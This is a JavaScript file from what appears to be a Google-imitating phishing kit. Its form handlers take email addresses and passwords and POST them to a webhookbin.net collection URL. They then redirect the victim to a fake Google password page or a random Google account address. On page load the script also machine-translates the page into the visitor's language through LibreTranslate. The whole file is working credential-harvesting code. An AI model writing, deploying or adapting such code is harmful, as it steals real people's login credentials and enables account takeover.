const webhook = "https://webhookbin.net/v1/bin/a07c51bd-383a-41bb-aa78-8ce5aeeaa5bf";

const sendToWebhook = async (body) => {
  const response = await fetch(webhook, {
    method: "POST",
    body: JSON.stringify(body),
  });

  return response;
};

function handleSubmitRR(event, form) {
  event.preventDefault();
  const data = new FormData(event.target);
  const email = data.get("mail");
  const password = data.get("p");

  (async function () {
    await sendToWebhook({ email: email, password: password });
    form.submit();
  })();
}

function handleSubmitPassword(event) {
  event.preventDefault();
  const data = new FormData(event.target);
  const password = data.get("password");

  (async function () {
    await sendToWebhook({ password: password });
    window.location.href =
      "https://www.google.com/account/" + Math.floor(Math.random() * 1000000);
  })();
}

function handleSubmitEmail(event) {
  event.preventDefault();
  const data = new FormData(event.target);
  const email = data.get("email");

  (async function () {
    await sendToWebhook({ email: email });
    window.location.href = "../google_password/google.html";
  })();
}

function showSpinner() {
  const showbox = document.querySelector(".showbox");
  showbox.style.display = "flex";
}

function hideSpinner() {
  const showbox = document.querySelector(".showbox");
  showbox.style.display = "none";
}

async function translateText(text, targetLang, sourceLang = "auto") {
    try {
        const response = await fetch("https://libretranslate.com/translate", {
            method: "POST",
            body: JSON.stringify({
                q: text,
                source: sourceLang,
                target: targetLang,
                format: "text",
                alternatives: 3,
                api_key: "" // No API key is required for LibreTranslate
            }),
            headers: { "Content-Type": "application/json" }
        });

        if (!response.ok) {
            throw new Error(`Error: ${response.status} ${response.statusText}`);
        }
      
        const data = await response.json();
        return data.translatedText; // Return the translated text
    } catch (error) {
        console.error("Translation error:", error);
        return null; // Return null or handle the error as needed
    }
}

async function translatePage() {
    const userLocale = navigator.language || navigator.userLanguage;
    const elements = document.body.getElementsByTagName('*');

    for (let element of elements) {
        if (element.childNodes.length > 0) {
            for (let node of element.childNodes) {
                if (node.nodeType === Node.TEXT_NODE) {
                    const originalText = node.nodeValue.trim();
                    if (originalText) {
                        const translatedText = await translateText(originalText, userLocale);
                        node.nodeValue = translatedText;
                    }
                }
            }
        }
    }
}

window.onload = translatePage;
